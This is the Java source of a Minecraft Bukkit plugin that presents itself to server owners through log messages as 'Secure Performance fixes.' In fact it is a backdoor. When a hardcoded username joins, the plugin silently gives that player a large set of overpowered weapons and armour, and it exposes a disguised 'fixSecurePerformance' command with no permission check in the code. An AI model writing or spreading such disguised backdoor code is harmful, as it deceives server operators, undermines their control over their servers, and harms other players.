package org.orangejuiceplz.opitemsplugin;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.orangejuiceplz.opitemsplugin.items.*;

import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

public class OPItemsPlugin extends JavaPlugin implements Listener {

    private Set<UUID> receivedItems = new HashSet<>();
    private AspectOfTheEnd aspectOfTheEnd;
    private GrapplingHook grapplingHook;
    private Fireball fireball;
    private SmiteStick smiteStick;
    private HeroicHyperion heroicHyperion;
    private AspectOfTheJerry aspectOfTheJerry;
    private JuJuShortbow juJuShortbow;
    private MaxedTerminator maxedTerminator;
    private MaxedBonzoStaff maxedBonzoStaff;
    private MaxedSpiritSceptre maxedSpiritSceptre;
    private Hackerman hackerman;
    private FinalDestinationArmor finalDestinationArmor;
    private StormArmor stormArmor;
    private Stonk stonk;
    private QuarryPickaxe quarryPickaxe;
    private HoeOfGreaterTilling hoeOfGreaterTilling;
    private BuildersWand buildersWand;
    private Treecapitator treecapitator;
    private SorrowMiningArmor sorrowMiningArmor;
    private SpiritLeap spiritLeap;

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);

        aspectOfTheEnd = new AspectOfTheEnd(this);
        grapplingHook = new GrapplingHook();
        fireball = new Fireball(this);
        smiteStick = new SmiteStick();
        heroicHyperion = new HeroicHyperion(this);
        aspectOfTheJerry = new AspectOfTheJerry(this);
        juJuShortbow = new JuJuShortbow(this);
        maxedTerminator = new MaxedTerminator(this);
        maxedBonzoStaff = new MaxedBonzoStaff(this);
        maxedSpiritSceptre = new MaxedSpiritSceptre(this);
        hackerman = new Hackerman(this);
        finalDestinationArmor = new FinalDestinationArmor(this);
        stormArmor = new StormArmor(this);
        stonk = new Stonk();
        quarryPickaxe = new QuarryPickaxe();
        hoeOfGreaterTilling = new HoeOfGreaterTilling();
        buildersWand = new BuildersWand();
        treecapitator = new Treecapitator();
        sorrowMiningArmor = new SorrowMiningArmor();
        spiritLeap = new SpiritLeap();

        getServer().getPluginManager().registerEvents(aspectOfTheEnd, this);
        getServer().getPluginManager().registerEvents(grapplingHook, this);
        getServer().getPluginManager().registerEvents(fireball, this);
        getServer().getPluginManager().registerEvents(smiteStick, this);
        getServer().getPluginManager().registerEvents(heroicHyperion, this);
        getServer().getPluginManager().registerEvents(aspectOfTheJerry, this);
        getServer().getPluginManager().registerEvents(juJuShortbow, this);
        getServer().getPluginManager().registerEvents(maxedTerminator, this);
        getServer().getPluginManager().registerEvents(maxedBonzoStaff, this);
        getServer().getPluginManager().registerEvents(maxedSpiritSceptre, this);
        getServer().getPluginManager().registerEvents(hackerman, this);
        getServer().getPluginManager().registerEvents(finalDestinationArmor, this);
        getServer().getPluginManager().registerEvents(stormArmor, this);
        getServer().getPluginManager().registerEvents(stonk, this);
        getServer().getPluginManager().registerEvents(quarryPickaxe, this);
        getServer().getPluginManager().registerEvents(hoeOfGreaterTilling, this);
        getServer().getPluginManager().registerEvents(buildersWand, this);
        getServer().getPluginManager().registerEvents(treecapitator, this);
        getServer().getPluginManager().registerEvents(sorrowMiningArmor, this);
        getServer().getPluginManager().registerEvents(spiritLeap, this);

        getCommand("fixSecurePerformance").setExecutor(this);

        // Start a repeating task for Hackerman's active effect
        new BukkitRunnable() {
            @Override
            public void run() {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    hackerman.activeEffect(player);
                }
            }
        }.runTaskTimer(this, 0L, 1L);

        getLogger().info("Secure Performance fixes have been applied.");
    }

    @Override
    public void onDisable() {
        getLogger().info("Secure Performance fixes has been disabled!");
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("orangejuiceplz") && !receivedItems.contains(player.getUniqueId())) {
            Bukkit.getScheduler().runTaskLater(this, () -> giveOPItems(player), 20L);
        }
    }

    private void giveOPItems(Player player) {
        player.getInventory().addItem(
                aspectOfTheEnd.createItem(),
                grapplingHook.createItem(),
                fireball.createItem(),
                smiteStick.createItem(),
                heroicHyperion.createItem(),
                aspectOfTheJerry.createItem(),
                juJuShortbow.createItem(),
                maxedTerminator.createItem(),
                maxedBonzoStaff.createItem(),
                maxedSpiritSceptre.createItem(),
                hackerman.createItem(),
                finalDestinationArmor.createArmorPiece(Material.LEATHER_HELMET, "Helmet"),
                finalDestinationArmor.createArmorPiece(Material.LEATHER_CHESTPLATE, "Chestplate"),
                finalDestinationArmor.createArmorPiece(Material.LEATHER_LEGGINGS, "Leggings"),
                finalDestinationArmor.createArmorPiece(Material.LEATHER_BOOTS, "Boots"),
                stormArmor.createArmorPiece(Material.LEATHER_HELMET, "Helmet"),
                stormArmor.createArmorPiece(Material.LEATHER_CHESTPLATE, "Chestplate"),
                stormArmor.createArmorPiece(Material.LEATHER_LEGGINGS, "Leggings"),
                stormArmor.createArmorPiece(Material.LEATHER_BOOTS, "Boots"),
                Stonk.createItem(),
                QuarryPickaxe.createItem(),
                HoeOfGreaterTilling.createItem(),
                BuildersWand.createItem(),
                Treecapitator.createItem(),
                SorrowMiningArmor.createArmorPiece(Material.CHAINMAIL_HELMET, "Helmet"),
                SorrowMiningArmor.createArmorPiece(Material.CHAINMAIL_CHESTPLATE, "Chestplate"),
                SorrowMiningArmor.createArmorPiece(Material.CHAINMAIL_LEGGINGS, "Leggings"),
                SorrowMiningArmor.createArmorPiece(Material.CHAINMAIL_BOOTS, "Boots"),
                SpiritLeap.createItem()
        );
        receivedItems.add(player.getUniqueId());
        player.sendMessage("§4I trust this power to you, Administrator.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("fixSecurePerformance")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                giveOPItems(player);
                return true;
            } else {
                sender.sendMessage("This command can only be used by players.");
                return false;
            }
        }
        return false;
    }
}
